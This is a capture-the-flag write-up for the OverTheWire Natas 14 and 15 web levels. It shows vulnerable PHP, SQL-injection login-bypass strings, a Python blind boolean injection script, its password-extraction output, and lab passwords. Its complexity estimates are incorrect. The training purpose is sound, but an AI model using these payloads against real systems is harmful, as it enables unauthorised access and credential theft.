Starting this challenge, we'll be doing some fun SQL injection challenges. You may want to read about SQL queries, Regex and Python for easier understanding.<br /><h2>Natas 14</h2>Taking a look at the source code shows how the query is generated:<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f0f0f0; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #007020;">&lt;?</span><br /><span style="color: #007020; font-weight: bold;">if</span>(<span style="color: #007020;">array_key_exists</span>(<span style="color: #4070a0;">"username"</span>, <span style="color: #bb60d5;">$_REQUEST</span>)) {<br />    <span style="color: #bb60d5;">$link</span> <span style="color: #666666;">=</span> <span style="color: #007020;">mysql_connect</span>(<span style="color: #4070a0;">'localhost'</span>, <span style="color: #4070a0;">'natas14'</span>, <span style="color: #4070a0;">'&lt;censored&gt;'</span>);<br />    <span style="color: #007020;">mysql_select_db</span>(<span style="color: #4070a0;">'natas14'</span>, <span style="color: #bb60d5;">$link</span>);<br />    <br />    <span style="color: #bb60d5;">$query</span> <span style="color: #666666;">=</span> <span style="color: #4070a0;">"SELECT * from users where username=</span><span style="color: #4070a0; font-weight: bold;">\"</span><span style="color: #4070a0;">"</span><span style="color: #666666;">.</span><span style="color: #bb60d5;">$_REQUEST</span>[<span style="color: #4070a0;">"username"</span>]<span style="color: #666666;">.</span><span style="color: #4070a0;">"</span><span style="color: #4070a0; font-weight: bold;">\"</span><span style="color: #4070a0;"> and password=</span><span style="color: #4070a0; font-weight: bold;">\"</span><span style="color: #4070a0;">"</span><span style="color: #666666;">.</span><span style="color: #bb60d5;">$_REQUEST</span>[<span style="color: #4070a0;">"password"</span>]<span style="color: #666666;">.</span><span style="color: #4070a0;">"</span><span style="color: #4070a0; font-weight: bold;">\"</span><span style="color: #4070a0;">"</span>;<br />    <span style="color: #007020; font-weight: bold;">if</span>(<span style="color: #007020;">array_key_exists</span>(<span style="color: #4070a0;">"debug"</span>, <span style="color: #bb60d5;">$_GET</span>)) {<br />        <span style="color: #007020; font-weight: bold;">echo</span> <span style="color: #4070a0;">"Executing query: </span><span style="color: #70a0d0; font-style: italic;">$query</span><span style="color: #4070a0;">&lt;br&gt;"</span>;<br />    }<br /><br />    <span style="color: #007020; font-weight: bold;">if</span>(<span style="color: #007020;">mysql_num_rows</span>(<span style="color: #007020;">mysql_query</span>(<span style="color: #bb60d5;">$query</span>, <span style="color: #bb60d5;">$link</span>)) <span style="color: #666666;">&gt;</span> <span style="color: #40a070;">0</span>) {<br />            <span style="color: #007020; font-weight: bold;">echo</span> <span style="color: #4070a0;">"Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;"</span>;<br />    } <span style="color: #007020; font-weight: bold;">else</span> {<br />            <span style="color: #007020; font-weight: bold;">echo</span> <span style="color: #4070a0;">"Access denied!&lt;br&gt;"</span>;<br />    }<br />    <span style="color: #007020;">mysql_close</span>(<span style="color: #bb60d5;">$link</span>);<br />} <span style="color: #007020; font-weight: bold;">else</span> {<br /><span style="color: #007020;">?&gt;</span> <br /></pre></div><br /><b>Query: </b>SELECT * from users where username="<i>&lt;user&gt;</i>" and password="<i>&lt;password&gt;</i>"<br /><br />You'll notice that the user input is not being filtered, which means we can use escape characters to make the query act differently than it should be. Since we're trying to log in as Natas15, let's manipulate the query in a way that will bypass checking for a valid password.<br />All the following combinations work (among many others):<br /><ul><li>User: natas15" #<br />Pass: &lt;empty&gt;<br />Query: SELECT * from users where username="<b>natas15" # </b><i><span style="color: #999999;">and password = ""</span></i><b><br /></b></li><br /><li>User: " or 1 = 1 #<br />Pass: &lt;empty&gt;<br />Query: SELECT * from users where username="<b>" or 1 = 1 #</b> <span style="color: #999999;"><i>and password = ""</i></span></li><br /><li>User: natas15<br />Pass: " or "1"="1<br />Query: SELECT * from users where username="<b>natas15</b>" and password = "<b>" or "1" = "1</b>" </li></ul><br /><i>Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</i><br /><h2>Natas 15</h2><div style="background: #f0f0f0; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #007020;">&lt;?</span><br /><br /><span style="color: #60a0b0; font-style: italic;">/*</span><br /><span style="color: #60a0b0; font-style: italic;">CREATE TABLE `users` (</span><br /><span style="color: #60a0b0; font-style: italic;">  `username` varchar(64) DEFAULT NULL,</span><br /><span style="color: #60a0b0; font-style: italic;">  `password` varchar(64) DEFAULT NULL</span><br /><span style="color: #60a0b0; font-style: italic;">);</span><br /><span style="color: #60a0b0; font-style: italic;">*/</span><br /><br /><span style="color: #007020; font-weight: bold;">if</span>(<span style="color: #007020;">array_key_exists</span>(<span style="color: #4070a0;">"username"</span>, <span style="color: #bb60d5;">$_REQUEST</span>)) {<br />    <span style="color: #bb60d5;">$link</span> <span style="color: #666666;">=</span> <span style="color: #007020;">mysql_connect</span>(<span style="color: #4070a0;">'localhost'</span>, <span style="color: #4070a0;">'natas15'</span>, <span style="color: #4070a0;">'&lt;censored&gt;'</span>);<br />    <span style="color: #007020;">mysql_select_db</span>(<span style="color: #4070a0;">'natas15'</span>, <span style="color: #bb60d5;">$link</span>);<br />    <br />    <span style="color: #bb60d5;">$query</span> <span style="color: #666666;">=</span> <span style="color: #4070a0;">"SELECT * from users where username=</span><span style="color: #4070a0; font-weight: bold;">\"</span><span style="color: #4070a0;">"</span><span style="color: #666666;">.</span><span style="color: #bb60d5;">$_REQUEST</span>[<span style="color: #4070a0;">"username"</span>]<span style="color: #666666;">.</span><span style="color: #4070a0;">"</span><span style="color: #4070a0; font-weight: bold;">\"</span><span style="color: #4070a0;">"</span>;<br />    <span style="color: #007020; font-weight: bold;">if</span>(<span style="color: #007020;">array_key_exists</span>(<span style="color: #4070a0;">"debug"</span>, <span style="color: #bb60d5;">$_GET</span>)) {<br />        <span style="color: #007020; font-weight: bold;">echo</span> <span style="color: #4070a0;">"Executing query: </span><span style="color: #70a0d0; font-style: italic;">$query</span><span style="color: #4070a0;">&lt;br&gt;"</span>;<br />    }<br /><br />    <span style="color: #bb60d5;">$res</span> <span style="color: #666666;">=</span> <span style="color: #007020;">mysql_query</span>(<span style="color: #bb60d5;">$query</span>, <span style="color: #bb60d5;">$link</span>);<br />    <span style="color: #007020; font-weight: bold;">if</span>(<span style="color: #bb60d5;">$res</span>) {<br />    <span style="color: #007020; font-weight: bold;">if</span>(<span style="color: #007020;">mysql_num_rows</span>(<span style="color: #bb60d5;">$res</span>) <span style="color: #666666;">&gt;</span> <span style="color: #40a070;">0</span>) {<br />        <span style="color: #007020; font-weight: bold;">echo</span> <span style="color: #4070a0;">"This user exists.&lt;br&gt;"</span>;<br />    } <span style="color: #007020; font-weight: bold;">else</span> {<br />        <span style="color: #007020; font-weight: bold;">echo</span> <span style="color: #4070a0;">"This user doesn't exist.&lt;br&gt;"</span>;<br />    }<br />    } <span style="color: #007020; font-weight: bold;">else</span> {<br />        <span style="color: #007020; font-weight: bold;">echo</span> <span style="color: #4070a0;">"Error in query.&lt;br&gt;"</span>;<br />    }<br /><br />    <span style="color: #007020;">mysql_close</span>(<span style="color: #bb60d5;">$link</span>);<br />} <span style="color: #007020; font-weight: bold;">else</span> {<br /><span style="color: #007020;">?&gt;</span> <br /></pre></div><br />In this example we'll be introduced to <a href="https://www.exploit-db.com/docs/17397.pdf">blind-based SQL injection</a>, more specifically to boolean based one. Inspecting the source code above shows us that no data from the database is sent directly to us, instead we get 3 types of responses depending on our query.<br /><br />How can we retrieve the password? By asking questions! Like, does the password contain the letter 'a'? Does the letter 'x' come first?<br /><br />Python script consists of two steps:<br /><ol><li>Find a reduced sample size to bruteforce the password (since the number of valid characters is 62, and the password is only 32 characters long) without caring about position.</li><li>Use the smaller set to get the exact word, password is an empty string where you keep looping for the next character, append it to the password and repeat, till you get the 32 characters long password.</li></ol><!-- HTML generated using hilite.me --><br /><div style="background: #f0f0f0; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #007020; font-weight: bold;">import</span> <span style="color: #0e84b5; font-weight: bold;">requests</span><br /><span style="color: #007020; font-weight: bold;">from</span> <span style="color: #0e84b5; font-weight: bold;">requests.auth</span> <span style="color: #007020; font-weight: bold;">import</span> HTTPBasicAuth<br /><br />chars <span style="color: #666666;">=</span> <span style="color: #4070a0;">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><br />filtered <span style="color: #666666;">=</span> <span style="color: #4070a0;">''</span><br />passwd <span style="color: #666666;">=</span> <span style="color: #4070a0;">''</span><br /><br /><span style="color: #007020; font-weight: bold;">for</span> char <span style="color: #007020; font-weight: bold;">in</span> chars:<br />    Data <span style="color: #666666;">=</span> {<span style="color: #4070a0;">'username'</span> : <span style="color: #4070a0;">'natas16" and password LIKE BINARY "%'</span> <span style="color: #666666;">+</span> char <span style="color: #666666;">+</span> <span style="color: #4070a0;">'%" #'</span>}<br />    r <span style="color: #666666;">=</span> requests<span style="color: #666666;">.</span>post(<span style="color: #4070a0;">'http://natas15.natas.labs.overthewire.org/index.php?debug'</span>, auth<span style="color: #666666;">=</span>HTTPBasicAuth(<span style="color: #4070a0;">'natas15'</span>, <span style="color: #4070a0;">'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'</span>), data <span style="color: #666666;">=</span> Data)<br />    <span style="color: #007020; font-weight: bold;">if</span> <span style="color: #4070a0;">'exists'</span> <span style="color: #007020; font-weight: bold;">in</span> r<span style="color: #666666;">.</span>text :<br />        filtered <span style="color: #666666;">=</span> filtered <span style="color: #666666;">+</span> char<br /><br /><span style="color: #007020; font-weight: bold;">for</span> i <span style="color: #007020; font-weight: bold;">in</span> <span style="color: #007020;">range</span>(<span style="color: #40a070;">0</span>,<span style="color: #40a070;">32</span>):  <br />    <span style="color: #007020; font-weight: bold;">for</span> char <span style="color: #007020; font-weight: bold;">in</span> filtered:<br />        Data <span style="color: #666666;">=</span> {<span style="color: #4070a0;">'username'</span> : <span style="color: #4070a0;">'natas16" and password LIKE BINARY "'</span> <span style="color: #666666;">+</span> passwd <span style="color: #666666;">+</span> char <span style="color: #666666;">+</span> <span style="color: #4070a0;">'%" #'</span>}<br />        r <span style="color: #666666;">=</span> requests<span style="color: #666666;">.</span>post(<span style="color: #4070a0;">'http://natas15.natas.labs.overthewire.org/index.php?debug'</span>, auth<span style="color: #666666;">=</span>HTTPBasicAuth(<span style="color: #4070a0;">'natas15'</span>, <span style="color: #4070a0;">'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'</span>), data <span style="color: #666666;">=</span> Data)<br />        <span style="color: #007020; font-weight: bold;">if</span> <span style="color: #4070a0;">'exists'</span> <span style="color: #007020; font-weight: bold;">in</span> r<span style="color: #666666;">.</span>text :<br />            passwd <span style="color: #666666;">=</span> passwd <span style="color: #666666;">+</span> char<br />            <span style="color: #007020; font-weight: bold;">print</span>(passwd)<br />            <span style="color: #007020; font-weight: bold;">break</span><br /></pre></div><br />If we didn't reduce our sample size, code complexity would've been O(32 ^ 62), instead it became O(62 + 32^25), which is much, much faster.<br /><br />Output:<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f0f0f0; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;">W<br />Wa<br />WaI<br />WaIH<br />WaIHE<br />WaIHEa<br />WaIHEac<br />WaIHEacj<br />WaIHEacj6<br />WaIHEacj63<br />WaIHEacj63w<br />WaIHEacj63wn<br />WaIHEacj63wnN<br />WaIHEacj63wnNI<br />WaIHEacj63wnNIB<br />WaIHEacj63wnNIBR<br />WaIHEacj63wnNIBRO<br />WaIHEacj63wnNIBROH<br />WaIHEacj63wnNIBROHe<br />WaIHEacj63wnNIBROHeq<br />WaIHEacj63wnNIBROHeqi<br />WaIHEacj63wnNIBROHeqi3<br />WaIHEacj63wnNIBROHeqi3p<br />WaIHEacj63wnNIBROHeqi3p9<br />WaIHEacj63wnNIBROHeqi3p9t<br />WaIHEacj63wnNIBROHeqi3p9t0<br />WaIHEacj63wnNIBROHeqi3p9t0m<br />WaIHEacj63wnNIBROHeqi3p9t0m5<br />WaIHEacj63wnNIBROHeqi3p9t0m5n<br />WaIHEacj63wnNIBROHeqi3p9t0m5nh<br />WaIHEacj63wnNIBROHeqi3p9t0m5nhm<br />WaIHEacj63wnNIBROHeqi3p9t0m5nhmh<br /></pre></div><br /><code><br /></code>Natas16 password is WaIHEacj63wnNIBROHeqi3p9t0m5nhmh<br /><br /><i>Currently listening to <a href="https://www.youtube.com/watch?v=v1Umdmtg-D8">Sirenia - In a Manica</a></i>